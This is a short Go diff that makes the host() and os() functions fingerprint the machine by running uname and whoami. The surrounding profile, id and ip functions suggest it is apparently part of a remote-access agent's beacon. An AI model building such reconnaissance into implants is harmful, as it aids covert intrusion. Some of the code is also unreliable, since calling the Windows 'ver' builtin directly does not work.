@@ -16,6 +16,7 @@ import(
   "fmt"
   "time"
   "encoding/base64"
+  "os/exec"
 )
 
 type _profile struct {
@@ -195,16 +196,29 @@ func id() string {
 func host() string {
   switch os := runtime.GOOS; os {
 	case "linux":
-    return "reed"
+    nodename, _ := exec.Command("uname", "-n").Output()
+    user, _ := exec.Command("whoami").Output()
+    host := strings.TrimSuffix(string(nodename), "\n") + "\\" + strings.TrimSuffix(string(user), "\n")
+    return host
   case "windows":
-    return "leoneil"
+    host, _ := exec.Command("whoami").Output()
+    return strings.TrimSuffix(string(host), "\n")
 	default:
-		return "unkown"
+		return ""
 	}
 }
 
 func os() string {
-  return runtime.GOOS
+  switch os := runtime.GOOS; os {
+	case "linux":
+    os, _ := exec.Command("uname", "-sr").Output()
+    return strings.TrimSuffix(string(os), "\n")
+  case "windows":
+    os, _ := exec.Command("ver").Output()
+    return strings.TrimSuffix(string(os), "\n")
+	default:
+		return os
+	}
 }
 
 func ip() string {
